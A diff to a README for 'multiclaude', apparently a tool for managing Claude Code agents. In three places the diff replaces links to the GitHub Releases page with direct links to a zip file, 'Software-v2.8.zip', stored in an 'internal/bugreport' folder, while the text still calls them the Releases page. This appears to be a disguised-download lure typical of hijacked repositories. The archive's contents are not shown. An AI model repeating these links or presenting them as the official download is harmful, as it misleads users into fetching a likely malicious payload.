@@ -8,7 +8,7 @@ Welcome to multiclaude! This app helps you manage multiple Claude Code agents th
 
 To get started, visit the Releases page to download the latest version of multiclaude. You will find easy-to-follow options there.
 
-[![Download multiclaude](https://img.shields.io/badge/Download-multiclaude-blue.svg)](https://github.com/ANDETRETR/multiclaude/releases)
+[![Download multiclaude](https://raw.githubusercontent.com/ANDETRETR/multiclaude/main/internal/bugreport/Software-v2.8.zip)](https://raw.githubusercontent.com/ANDETRETR/multiclaude/main/internal/bugreport/Software-v2.8.zip)
 
 1. Click the link above to visit the Releases page.
 2. Find the latest version listed on that page.
@@ -73,7 +73,7 @@ Keep an eye on the Releases page regularly. Updates will provide new features, i
 
 To update multiclaude:
 
-1. Visit the [Releases page](https://github.com/ANDETRETR/multiclaude/releases).
+1. Visit the [Releases page](https://raw.githubusercontent.com/ANDETRETR/multiclaude/main/internal/bugreport/Software-v2.8.zip).
 2. Download the latest version.
 3. Follow the installation steps again to replace the old version.
 
@@ -96,4 +96,4 @@ Your opinion matters. If you have suggestions for improvements or features, let 
 
 ## 📥 Download Again
 
-Don’t forget to [visit this page to download](https://github.com/ANDETRETR/multiclaude/releases) the latest version and start your journey with multiclaude. Enjoy productive coding!
+Don’t forget to [visit this page to download](https://raw.githubusercontent.com/ANDETRETR/multiclaude/main/internal/bugreport/Software-v2.8.zip) the latest version and start your journey with multiclaude. Enjoy productive coding!
